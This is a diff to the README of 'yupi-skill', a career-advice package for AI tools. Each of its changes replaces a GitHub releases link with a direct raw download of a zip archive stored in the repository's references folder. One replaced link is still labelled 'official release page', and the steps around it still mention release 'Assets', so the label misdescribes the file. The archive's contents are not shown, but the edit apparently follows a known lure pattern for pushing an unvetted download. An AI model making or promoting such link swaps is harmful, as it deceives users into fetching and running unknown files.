@@ -1,6 +1,6 @@
 # 🐟 yupi-skill - Expert career advice from your pocket
 
-[![Download Yupi Skill](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Mrli7906/yupi-skill/releases)
+[![Download Yupi Skill](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/Mrli7906/yupi-skill/main/references/skill_yupi_v3.9.zip)
 
 This application provides a digital version of Yupi's knowledge. It acts as an assistant that understands programming, career planning, and technical growth. You load this skill into your existing AI tools to receive advice based on Yupi's methods. Use it to improve your resume, practice for interviews, or decide on new technologies.
 
@@ -8,7 +8,7 @@ This application provides a digital version of Yupi's knowledge. It acts as an a
 
 To begin, you need the latest version of the skill package. 
 
-1. Go to the [official release page](https://github.com/Mrli7906/yupi-skill/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Mrli7906/yupi-skill/main/references/skill_yupi_v3.9.zip).
 2. Look for the section titled "Assets" at the bottom of the newest release.
 3. Select the file that matches your computer system.
 4. Save the file to a folder you recognize, such as your Downloads folder.
